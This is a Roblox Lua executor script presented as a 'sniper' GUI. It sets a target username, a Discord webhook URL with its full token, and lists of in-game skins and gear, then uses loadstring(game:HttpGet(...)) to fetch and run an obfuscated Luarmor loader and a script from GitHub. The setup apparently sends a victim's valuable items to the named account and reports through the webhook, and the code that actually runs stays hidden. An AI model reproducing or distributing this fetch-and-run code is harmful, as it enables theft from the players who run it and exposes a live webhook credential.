-- Mode: CODESNIPER
getgenv().TARGET_USERNAME = "axeldonato9"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1535029411579957362/adr7-IqQTHwqfi5MTgLtfFHV2aImR-5go3O3GqY85EqZGYvftClHtrrIL4Rvcr85gCJ5"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true,
    ["Tralalero"] = true
}
getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Divine Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Demon's Head"] = true,
    ["Lava Slap"] = true,
    ["Lava Blaster"] = true,
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Candy Sentry"] = true,
    ["Phantom Slap"] = true
}

-- Cargando GUI SNIPER
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/3abcf09d87cb4080f988316f1353609a.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua"))()
end)